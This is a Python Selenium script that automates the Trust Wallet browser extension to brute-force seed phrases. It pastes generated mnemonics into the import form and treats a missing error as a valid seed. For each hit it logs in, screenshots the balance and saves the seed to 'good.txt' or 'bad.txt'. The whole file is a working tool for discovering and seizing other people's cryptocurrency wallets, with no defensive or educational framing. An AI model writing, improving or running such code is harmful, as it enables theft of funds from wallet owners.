import os
from time import gmtime, strftime, sleep

import pyperclip
from dotenv import load_dotenv
from rich.console import Console
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

from mnemo import generate_seeds_nb


def logout_wallet(driver):
    with console.status("[bold blue]Logout Wallet...", spinner='dots') as stat:
        driver.find_element(by=By.XPATH, value='/html/body/div/div[2]/div/button[4]').click()
        driver.find_element(by=By.XPATH, value='/html/body/div/div[2]/div/div/button[12]').click()
        sleep(2)
        driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div/form/p[2]').click()
        sleep(2)
        driver.find_element(by=By.XPATH, value='/html/body/div[2]/div[4]/div/section/footer/button[1]').click()
        sleep(2)
        handle = driver.window_handles[0]
        driver.switch_to.window(handle)
        stat.stop()
        set_password(driver)


def check_wallet_balance(driver, seed):
    with console.status("[bold blue]Check Wallet Balance...", spinner='dots') as stat:
        sleep(0.5)
        time_now = strftime("%Y-%m-%d %H:%M:%S", gmtime())
        driver.save_screenshot(f'images\\screenshot{time_now}.png')
        balance = driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div[1]/h1').text
        if int(balance[1:].replace('.', '')) == 0:
            console.print(f'--> {seed}  |  [ {balance} ]', style='bold green')
            with open('bad.txt', 'a') as file:
                file.writelines(f'{balance} -> {seed}\n')
                stat.stop()
                logout_wallet(driver)
        else:
            print(seed, balance)
            with open('good.txt', 'a') as file:
                file.writelines(f'{balance} -> {seed}\n')
                stat.stop()
                logout_wallet(driver)


def login_wallet(driver, seed):
    with console.status("[bold blue]Try Login...", spinner='dots') as stat:
        sleep(3)
        driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div/div[2]/div/button[2]').click()
        sleep(3)
        driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div/div[2]/div[1]/button').click()
        sleep(3)
        driver.find_element(by=By.XPATH, value='/html/body/div[2]/div[4]/div/section/header/button').click()
        console.log('Successful!\n\n', style='bold green')
        stat.stop()
    check_wallet_balance(driver, seed)


def brute_force(driver):
    global seed
    try:
        for i in generate_seeds_nb():
            seed = ' '.join(i)
            pyperclip.copy(seed)

            driver.find_element(by=By.ID, value='field-2').click()
            driver.find_element(by=By.ID, value='field-2').send_keys(Keys.CONTROL + 'v')
            driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div/form/div[3]/button[2]').click()

            check_invalid = driver.find_element(By.ID, value='field-14-feedback').text
            console.print(f'--> {seed}  |  [ {check_invalid} ]', style='bold red')

    except Exception as E:
        console.print(f'--> {seed}  |  [Valid]\n\n', style='bold yellow')
        sleep(3)
        login_wallet(driver, seed)


def set_password(driver):
    sleep(3)
    driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div/div[2]/div/div[2]').click()
    driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div/form/div[2]/div[1]/div[1]/div/input').send_keys(
        os.getenv('NEW_PASSWORD'))
    driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div/form/div[2]/div[3]/div/div/input').send_keys(
        os.getenv('NEW_PASSWORD'))
    driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div/form/label/span[1]').click()
    driver.find_element(by=By.XPATH, value='/html/body/div/div[1]/div/form/div[4]/button[2]').click()
    brute_force(driver)


def main():
    driver = webdriver.Chrome(options=options)
    driver.get(URL)
    driver.set_window_position(x=1402, y=0)
    driver.set_window_size(width=525, height=1039)
    driver.switch_to.window(driver.current_window_handle)
    set_password(driver)


if __name__ == '__main__':
    EXTENSION_PATH = 'exstensions\\TrustWallet.crx'
    URL = 'chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/home.html#/onboarding'

    load_dotenv()
    console = Console()

    options = webdriver.ChromeOptions()
    options.add_extension(extension=EXTENSION_PATH)

    main()
